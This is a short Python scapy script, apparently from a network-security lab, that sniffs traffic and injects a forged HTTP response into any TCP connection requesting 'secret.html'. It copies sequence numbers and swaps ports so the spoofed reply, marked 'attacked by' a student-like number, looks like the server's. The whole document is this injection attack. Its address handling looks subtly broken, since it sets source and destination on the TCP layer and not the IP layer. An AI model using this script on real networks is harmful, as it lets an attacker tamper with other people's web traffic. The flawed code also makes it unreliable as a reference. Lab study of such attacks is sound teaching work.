from scapy.all import *

data = '''HTTP/1.1 200 OK\r
Server: nginx/1.14.0 (Ubuntu)\r
Content-Type: text/html\r
Connection: keep-alive\r
Accept-Ranges: bytes\r
attacked by 2017011313\r
\r
'''


def attack(req):
    if 'secret.html' not in str(req):
        return
    resp = IP() / TCP() / data
    resp[TCP].dport = req[TCP].sport
    resp[TCP].sport = req[TCP].dport
    resp[TCP].seq = req[TCP].ack
    resp[TCP].ack = req[TCP].seq + len(req[TCP].load)
    resp[TCP].flags = 'AP'
    resp[TCP].src = req[TCP].dst
    resp[TCP].dst = req[TCP].src
    send(resp)


sniff(prn=attack, store=0)
